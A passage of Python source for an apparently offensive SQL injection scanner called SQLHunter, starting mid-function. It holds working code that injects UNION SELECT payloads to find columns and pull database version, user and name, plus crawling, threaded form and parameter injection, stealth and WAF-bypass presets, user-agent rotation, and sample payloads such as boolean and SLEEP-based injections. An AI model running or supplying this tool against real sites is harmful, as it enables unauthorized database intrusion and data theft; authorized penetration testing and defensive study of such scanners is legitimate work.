            break
        last_ok = n
    return last_ok


def _find_text_index(method: str, url: str, param: str, style: str, columns: int, marker: str) -> int:
    for i in range(1, columns + 1):
        expr = f"'" + marker + "'"
        payload = _union_select_payload(style, columns, i, expr)
        if method == 'GET':
            test_url = set_param(url, param, payload)
            resp = session_mgr.request('GET', test_url)
        else:
            raise NotImplementedError
        if resp and marker in (resp.text or ''):
            return i
    return 0


def exploit_union_get(url: str, param: str, base_fp: ResponseFingerprint, db_hint: Optional[str]) -> ExploitOutcome:
    marker = config.get('exploit_marker', 'SQLHX')
    max_cols = int(config.get('exploit_max_cols', 8) or 8)
    styles = ['num', 'str']
    for style in styles:
        cols = _find_columns('GET', url, param, style, base_fp, max_cols)
        if cols <= 0:
            continue
        text_pos = _find_text_index('GET', url, param, style, cols, marker)
        if text_pos <= 0:
            continue
        exprs = _db_exprs(db_hint, marker)
        details: Dict[str, Any] = {"columns": cols, "text_index": text_pos}
        for key, expr in exprs.items():
            payload = _union_select_payload(style, cols, text_pos, expr)
            test_url = set_param(url, param, payload)
            resp = session_mgr.request('GET', test_url)
            value = _extract_between(getattr(resp, 'text', '') or '', marker)
            if value:
                details[key] = value
        if details:
            return ExploitOutcome(True, style, cols, text_pos, details)
    return ExploitOutcome(False)


# ==============================================================================
#                              14. RECORDING WITH EXPLOIT
# ==============================================================================

def _record_finding(url: str, param: str, r: DetectResult, base_form: Optional[Dict[str, Any]] = None):
    key = (r.method, url, param, r.reason)
    if key in VULN_KEYS:
        return
    VULN_KEYS.add(key)

    entry = {
        "url": url,
        "parameter": param,
        "detection": r.reason,
        "elapsed": r.elapsed,
        "method": r.method,
        "payload": r.payload,
        "db": r.db_hint,
        "severity": _severity(r.reason),
    }
    if config.get('export_curl'):
        if r.method == 'GET':
            entry['curl'] = export_curl('GET', set_param(url, param, r.payload))
        else:
            form = dict(base_form or {})
            form[param] = r.payload
            entry['curl'] = export_curl('POST', url, data=form)
    if config.get('save_responses') and r.snippet:
        entry['response_artifact'] = _save_response_artifact('resp', r.snippet)

    # Auto exploitation (currently only UNION-based GET)
    if config.get('exploit') and r.method == 'GET':
        try:
            base_fp = baseline_fingerprint_request('GET', url)
            if base_fp:
                outcome = exploit_union_get(url, param, base_fp, r.db_hint)
                if outcome and outcome.success:
                    entry['exploit'] = outcome.details or {}
        except Exception as ex:
            logger.debug(f"Exploit failed for {url}::{param}: {ex}")

    VULNERABILITIES.append(entry)
    print_result(url, param, r.payload, r.reason, r.elapsed, method=r.method)


# ==============================================================================
#                              15. SCAN RUNNERS
# ==============================================================================

def _iter_filtered_params(params: Dict[str, List[str]] | Dict[str, str]) -> List[str]:
    if isinstance(params, dict):
        names = [p for p in params.keys() if _match_param_filters(p)]
    else:
        names = []
    limit = config.get('max_params_per_url')
    if limit is not None:
        try:
            limit = int(limit)
            names = names[:max(1, limit)]
        except Exception:
            pass
    return names


def scan_url(url: str, payloads: List[Dict[str, Any]]) -> None:
    url = normalize_url(url)
    logger.info(f"Scanning: {url}")
    base_fp = baseline_fingerprint_request('GET', url)
    if not base_fp:
        logger.warning(f"Skipping (no baseline): {url}")
        return

    params = get_params(url)
    if params:
        names = _iter_filtered_params(params)
        if names:
            workers = max(1, min(len(names), config.get('param_threads', 6)))
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(test_param_get, url, param, base_fp, payloads): param for param in names}
                for fut in as_completed(futs):
                    param = futs[fut]
                    try:
                        results = fut.result()
                        for r in results:
                            _record_finding(url, param, r)
                    except Exception as e:
                        logger.debug(f"Param task failed for {param} on {url}: {e}")

    resp = session_mgr.request('GET', url)
    if resp and getattr(resp, 'text', None):
        forms = extract_forms(resp.text, url)
        for form in forms:
            if not form.inputs:
                continue
            names = _iter_filtered_params(form.inputs)
            if not names:
                continue
            if form.method == 'POST':
                base_fp_form = baseline_fingerprint_request('POST', form.action, data=form.inputs) or base_fp
                workers = max(1, min(len(names), config.get('param_threads', 6)))
                with ThreadPoolExecutor(max_workers=workers) as ex:
                    futs = {ex.submit(test_param_post, form.action, param, base_fp_form, form.inputs, payloads): param for param in names}
                    for fut in as_completed(futs):
                        param = futs[fut]
                        try:
                            results = fut.result()
                            for r in results:
                                _record_finding(form.action, param, r, base_form=form.inputs)
                        except Exception as e:
                            logger.debug(f"Form param task failed for {param} on {form.action}: {e}")
            else:
                base_fp_form = baseline_fingerprint_request('GET', form.action) or base_fp
                workers = max(1, min(len(names), config.get('param_threads', 6)))
                with ThreadPoolExecutor(max_workers=workers) as ex:
                    futs = {}
                    for param in names:
                        url_with = set_param(form.action, param, form.inputs.get(param, ''))
                        futs[ex.submit(test_param_get, url_with, param, base_fp_form, payloads)] = (param, url_with)
                    for fut in as_completed(futs):
                        param, url_with = futs[fut]
                        try:
                            results = fut.result()
                            for r in results:
                                _record_finding(url_with, param, r)
                        except Exception as e:
                            logger.debug(f"GET-form param task failed for {param} on {url_with}: {e}")


def crawl(start_url: str, max_pages: int = 50, same_domain_only: bool = True) -> List[str]:
    start_url = normalize_url(start_url)
    start_domain = urlparse(start_url).netloc.lower()
    q: deque[str] = deque([start_url])
    visited: Set[str] = set()
    results: List[str] = []

    while q and len(visited) < max_pages and len(results) < config.get('max_urls', 1000):
        url = q.popleft()
        if url in visited:
            continue
        visited.add(url)
        resp = session_mgr.request('GET', url)
        if not resp or not getattr(resp, 'text', None):
            continue
        if get_params(url):
            results.append(url)
        for link in extract_links(resp.text, url):
            if same_domain_only and urlparse(link).netloc.lower() != start_domain:
                continue
            if link not in visited:
                q.append(link)
    return results


# ==============================================================================
#                              16. REPORTING
# ==============================================================================

def save_reports() -> None:
    if not VULNERABILITIES:
        logger.info("No vulnerabilities found.")
        return
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    if 'json' in config.get('report_format', 'html,json,csv'):
        out = REPORTS_DIR / f"report_{ts}.json"
        out.write_text(json.dumps(VULNERABILITIES, indent=2, ensure_ascii=False), encoding='utf-8')
        logger.info(f"Saved JSON report: {out}")
    if 'html' in config.get('report_format', 'html,json,csv'):
        html_rows = "\n".join(
            f"<tr><td>{v.get('severity')}</td><td>{v.get('method')}</td><td>{v['url']}</td><td>{v['parameter']}</td><td>{v['detection']}</td><td>{v.get('db') or ''}</td><td>{v['elapsed']:.2f}s</td><td>{(v.get('exploit') or {}).get('version','')}</td></tr>"
            for v in VULNERABILITIES
        )
        html_doc = f"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SQLHunter Report</title>
<style>table{{border-collapse:collapse}}td,th{{border:1px solid #ccc;padding:6px}}th{{background:#f4f4f4}}</style>
</head><body>
<h2>SQLHunter Report - {ts}</h2>
<table><thead><tr><th>Severity</th><th>Method</th><th>URL</th><th>Param</th><th>Detection</th><th>DB</th><th>RT</th><th>DB Version</th></tr></thead>
<tbody>
{html_rows}
</tbody></table>
</body></html>
"""
        out = REPORTS_DIR / f"report_{ts}.html"
        out.write_text(html_doc, encoding='utf-8')
        logger.info(f"Saved HTML report: {out}")
    if 'csv' in config.get('report_format', 'html,json,csv'):
        out = REPORTS_DIR / f"report_{ts}.csv"
        import csv
        with out.open('w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(["severity", "method", "url", "parameter", "detection", "db", "elapsed", "payload", "curl", "response_artifact", "db_version", "db_user", "db_name"])
            for v in VULNERABILITIES:
                ex = v.get('exploit') or {}
                w.writerow([
                    v.get('severity'), v.get('method'), v.get('url'), v.get('parameter'), v.get('detection'),
                    v.get('db') or '', f"{v.get('elapsed', 0):.2f}", v.get('payload') or '', (v.get('curl') or ''), v.get('response_artifact',''), ex.get('version',''), ex.get('user',''), ex.get('db','')
                ])
        logger.info(f"Saved CSV report: {out}")


# ==============================================================================
#                              17. CLI (WITH SHORTCUTS)
# ==============================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description=f"{TOOL_NAME} v{VERSION} - Advanced SQL Injection Scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Shortcuts:\n"
            "  -Q/--quick    : Fast scan (no crawl, lower payloads)\n"
            "  -S/--stealth  : Low & slow (rate-limit 1 rps, delay 0.3)\n"
            "  -D/--deep     : Aggressive + crawl + waf + higher threads\n"
            "Examples:\n"
            "  python sqlhunter.py -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' -Q\n"
            "  python sqlhunter.py -u 'http://site' -D --exploit\n"
        ),
    )

    sub = p.add_subparsers(dest='command')

    # Update payloads subcommand
    upd = sub.add_parser('update', help='Update payloads from URL and save locally')
    upd.add_argument('-u', '--url', help='URL to fetch payloads (JSON list or NDJSON/TXT)')
    upd.add_argument('-uP', '--payload-url', help='Alias for payload URL (domain without scheme also works)')
    upd.add_argument('-o', '--out', default=str(CONFIG_DIR / 'payloads.json'), help='Output path to save payloads (default: ~/.config/sqlhunter/payloads.json)')
    upd.add_argument('--merge', action='store_true', help='Merge with current default payloads')

    # Scan arguments
    target = p.add_mutually_exclusive_group(required=False)
    target.add_argument('-u', '--url', help='Single URL to start scanning (with or without params; domain without scheme also works)')
    target.add_argument('-ud', '--domain', help='Domain to scan (e.g., google.com). Scheme will be auto-added.')
    target.add_argument('-l', '--list', help='File path with list of URLs (one per line)')

    # Common aliases
    p.add_argument('-t', '--threads', type=int, help='Worker threads for targets (default 20)')
    p.add_argument('-pt', '--param-threads', type=int, help='Worker threads per URL parameters (default 6)')
    p.add_argument('-T', '--timeout', type=int, help='Request timeout (sec)')
    p.add_argument('-d', '--delay', type=float, help='Delay between requests (sec)')
    p.add_argument('-R', '--rate-limit', type=float, help='Requests per second (global)')
    p.add_argument('-P', '--proxy', help='Proxy, e.g., http://127.0.0.1:8080')
    p.add_argument('--no-verify', action='store_true', help='Disable SSL verification')
    p.add_argument('-s', '--silent', action='store_true', help='Silent mode')
    p.add_argument('-f', '--format', default=None, help='Report formats, comma separated (html,json,csv)')

    # Crawl
    p.add_argument('-c', '--crawl', action='store_true', help='Enable basic crawling')
    p.add_argument('-mp', '--max-pages', type=int, default=None, help='Max pages to crawl (default: 50)')
    p.add_argument('--same-domain-only', action='store_true', help='Restrict crawling to same domain')

    # Headers & Auth
    p.add_argument('-H', '--header', action='append', help="Custom header 'Key: Value' (repeatable)")
    p.add_argument('-ab', '--auth-basic', help='Basic auth credentials: user:pass')
    p.add_argument('-at', '--auth-bearer', help='Bearer token for Authorization header')
    p.add_argument('--rotate-ua', action='store_true', help='Rotate User-Agent per request')

    # WAF bypass
    p.add_argument('-w', '--waf', action='store_true', help='Enable tamper/encoding variants')

    # Payloads
    p.add_argument('-pL', '--payloads', help='Path to payloads file (json or txt)')
    p.add_argument('-x', '--export-curl', action='store_true', help='Include curl reproduction in report for findings')
    p.add_argument('--save-responses', action='store_true', help='Save response snippets to artifacts directory')

    # Login
    p.add_argument('--login-url', help='Login URL to POST credentials')
    p.add_argument('--login-data', help="Form-encoded login data, e.g., 'u=admin&p=pass'")
    p.add_argument('--login-json', help='Login JSON data (string or path to file)')
    p.add_argument('--csrf-param', help='CSRF parameter name to include in login data')
    p.add_argument('--csrf-regex', help='Regex to extract CSRF token from login page')

    # Filters
    p.add_argument('--include-params', help='Regex for parameter names to include')
    p.add_argument('--exclude-params', help='Regex for parameter names to exclude')
    p.add_argument('--max-params-per-url', type=int, help='Limit number of parameters tested per URL')

    # Exploit
    p.add_argument('-E', '--exploit', action='store_true', help='Attempt exploitation (UNION-based) on found GET vulns')
    p.add_argument('--exploit-max-cols', type=int, help='Max columns to try when exploiting (default 8)')

    # Preset shortcuts
    p.add_argument('-Q', '--quick', action='store_true', help='Quick scan preset')
    p.add_argument('-S', '--stealth', action='store_true', help='Stealth preset')
    p.add_argument('-D', '--deep', action='store_true', help='Deep scan preset')

    # UI options
    p.add_argument('--no-color', action='store_true', help='Disable ANSI colors in output')
    p.add_argument('-v', '--version', action='store_true', help='Show version and exit')

    return p


def _apply_presets(args: argparse.Namespace) -> None:
    # Quick: fewer payloads, no crawl, moderate threads
    if args.quick:
        config['threads'] = min(config.get('threads', 20), 20)
        config['param_threads'] = min(config.get('param_threads', 6), 6)
        config['crawl'] = False
        config['waf_bypass'] = False
    # Stealth: low rate, delay, no waf
    if args.stealth:
        config['rate_limit_rps'] = 1.0
        config['delay'] = max(config.get('delay', 0.05), 0.3)
        config['threads'] = 5
        config['param_threads'] = 2
        config['waf_bypass'] = False
    # Deep: crawl + waf + higher threads
    if args.deep:
        config['crawl'] = True
        config['waf_bypass'] = True
        config['threads'] = max(config.get('threads', 20), 40)
        config['param_threads'] = max(config.get('param_threads', 6), 10)
        config['max_pages'] = max(config.get('max_pages', 50), 80)


def update_config_from_args(args: argparse.Namespace) -> None:
    # Apply presets first so explicit flags can override them
    _apply_presets(args)
    if args.threads is not None:
        config['threads'] = max(1, int(args.threads))
    if args.param_threads is not None:
        config['param_threads'] = max(1, int(args.param_threads))
    if args.timeout is not None:
        config['timeout'] = int(args.timeout)
    if args.delay is not None:
        config['delay'] = max(0.0, float(args.delay))
    if args.rate_limit is not None:
        config['rate_limit_rps'] = float(args.rate_limit)
    if args.proxy:
        config['proxy'] = args.proxy
    if args.no_verify:
        config['verify_ssl'] = False
    if args.silent:
        config['silent'] = True
    if args.format:
        config['report_format'] = args.format

    # Crawl opts
    if args.crawl:
        config['crawl'] = True
    if args.max_pages is not None:
        config['max_pages'] = max(1, int(args.max_pages))
    if args.same_domain_only:
        config['same_domain_only'] = True

    # Output opts
    if args.export_curl:
        config['export_curl'] = True
    if args.save_responses:
        config['save_responses'] = True

    # Headers & UA
    hdrs = dict(config.get('custom_headers') or {})
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                hdrs[k.strip()] = v.strip()
    if args.auth_basic:
        import base64
        token = base64.b64encode(args.auth_basic.encode()).decode()
        hdrs['Authorization'] = f'Basic {token}'
    if args.auth_bearer:
        hdrs['Authorization'] = f'Bearer {args.auth_bearer}'
    config['custom_headers'] = hdrs
    if args.rotate_ua:
        config['rotate_ua_per_request'] = True

    # WAF
    if args.waf:
        config['waf_bypass'] = True

    # Filters
    if args.include_params:
        config['include_params'] = args.include_params
    if args.exclude_params:
        config['exclude_params'] = args.exclude_params
    if args.max_params_per_url is not None:
        config['max_params_per_url'] = int(args.max_params_per_url)

    # Exploitation
    if args.exploit:
        config['exploit'] = True
    if args.exploit_max_cols is not None:
        config['exploit_max_cols'] = max(1, int(args.exploit_max_cols))

    save_config(config)


# ==============================================================================
#                              18. MAIN
# ==============================================================================

def _fetch_url_text(u: str) -> Optional[str]:
    try:
        r = session_mgr.session.get(u, timeout=20, verify=config.get('verify_ssl', True), allow_redirects=True)
        if getattr(r, 'status_code', 0) >= 400:
            return None
        return r.text
    except Exception as e:
        logger.error(f"Failed fetching payloads: {e}")
        return None


def _parse_payloads_text(text: str) -> List[Dict[str, Any]]:
    # Try JSON array first
    try:
        data = json.loads(text)
        if isinstance(data, list):
            out: List[Dict[str, Any]] = []
            for item in data:
                if isinstance(item, str):
                    out.append({"payload": item, "type": "error"})
                elif isinstance(item, dict) and 'payload' in item:
                    out.append({"payload": str(item['payload']), "type": str(item.get('type', 'error'))})
            if out:
                return out
    except Exception:
        pass
    # Fallback: line-based
    return [{"payload": line.strip(), "type": "error"} for line in text.splitlines() if line.strip()]


def main(argv: Optional[List[str]] = None) -> int:
    global session_mgr
    argv = argv if argv is not None else sys.argv[1:]
    parser = build_parser()
    args = parser.parse_args(argv)

    # If command is 'update', only do update flow
    if getattr(args, 'command', None) == 'update':
        # Minimal session for fetching
        global session_mgr
        session_mgr = SessionManager()
        payload_src = args.url or args.payload_url
        if not payload_src:
            parser.error("update requires -u/--url or -uP/--payload-url")
            return 6
        payload_src = normalize_url(payload_src)
        text = _fetch_url_text(payload_src)
        if not text:
            logger.error("Failed to download payloads.")
            return 3
        fetched = _parse_payloads_text(text)
        if not fetched:
            logger.error("Downloaded payloads are empty/invalid.")
            return 4
        if args.merge:
            merged = merge_payloads(load_default_payloads(), fetched)
        else:
            merged = fetched
        out_path = Path(args.out)
        try:
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(json.dumps(merged, ensure_ascii=False, indent=2), encoding='utf-8')
            logger.info(f"Saved {len(merged)} payloads to {out_path}")
            return 0
        except Exception as e:
            logger.error(f"Failed saving payloads: {e}")
            return 5

    # UI flags early
    if getattr(args, 'version', False):
        print(f"{TOOL_NAME} v{VERSION} - by {AUTHOR}")
        return 0
    if getattr(args, 'no_color', False):
        config['no_color'] = True

    update_config_from_args(args)

    # Validate target presence for scan mode
    if not (getattr(args, 'url', None) or getattr(args, 'domain', None) or getattr(args, 'list', None)):
        parser.print_usage()
        logger.error("Please provide -u/--url or -ud/--domain or -l/--list (or use the 'update' subcommand).")
        return 1

    # Re-init session to apply headers/proxy/verify/UA/rate
    session_mgr = SessionManager()

    # Honor silent mode by reducing console verbosity
    if config.get('silent'):
        logger.setLevel(logging.ERROR)

    print_banner()

    # Optional login flow
    perform_login(args.login_url, args.login_data, args.login_json, args.csrf_param, args.csrf_regex)

    # Payload set
    payloads = load_default_payloads()
    # Auto-load local updated payloads if exists
    local_payloads_path = CONFIG_DIR / 'payloads.json'
    if local_payloads_path.exists():
        try:
            extra = json.loads(local_payloads_path.read_text(encoding='utf-8'))
            if isinstance(extra, list):
                payloads = merge_payloads(payloads, extra)
                logger.info(f"Loaded local payloads: {len(extra)} (merged)")
        except Exception as e:
            logger.warning(f"Failed to read local payloads: {e}")

    if args.quick:
        # keep smallest useful subset
        payloads = [
            {"payload": "'", "type": "error"},
            {"payload": "' OR '1'='1'--", "type": "boolean"},
            {"payload": "' AND SLEEP(5)--", "type": "time"},
            {"payload": "' UNION SELECT NULL--", "type": "union"},
        ]
    if args.payloads:
        loaded = load_payloads_from_file(args.payloads)
        if loaded:
            payloads = loaded
            logger.info(f"Loaded {len(payloads)} payloads from file")
        else:
            logger.warning("Failed to load payloads from file. Using defaults.")

    # Build target list
    targets: List[str] = []
    # Accept domain flag or raw domain in --url by auto-normalizing
    base_input = args.url or args.domain
    if base_input:
        norm = normalize_url(base_input)
        if config.get('crawl'):
            crawled = crawl(norm, max_pages=config.get('max_pages', 50), same_domain_only=config.get('same_domain_only', True))
            targets = [norm] + [u for u in crawled if u not in targets]
            logger.info(f"Crawled targets discovered: {len(targets)}")
        else:
            targets = [norm]
    elif args.list:
        if not os.path.exists(args.list):
            logger.error(f"List file not found: {args.list}")
            return 2
        with open(args.list, 'r', encoding='utf-8') as f:
            listed = [line.strip() for line in f if line.strip()]
        if config.get('crawl'):
            all_targets: List[str] = []
            for base in listed:
                all_targets.append(base)
                all_targets += crawl(base, max_pages=config.get('max_pages', 50), same_domain_only=config.get('same_domain_only', True))
            targets = list(dict.fromkeys(all_targets))
        else:
            targets = listed

    # Scan
    max_workers = max(1, int(config.get('threads', 20)))
    if max_workers <= 1 or len(targets) <= 1:
        for url in progress_bar(targets, desc="Targets"):
            try:
                scan_url(url, payloads)
            except KeyboardInterrupt:
                logger.info("Interrupted by user.")
                break
            except Exception as e:
                logger.exception(f"Unhandled error for {url}: {e}")
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futs = {ex.submit(scan_url, url, payloads): url for url in targets}
            for fut in progress_bar(as_completed(futs), desc="Targets", total=len(futs)):
                url = futs[fut]
                try:
                    fut.result()
                except KeyboardInterrupt:
                    logger.info("Interrupted by user.")
                    break
                except Exception as e:
                    logger.exception(f"Unhandled error for {url}: {e}")

    save_reports()
    return 0


if __name__ == '__main__':
    raise SystemExit(main())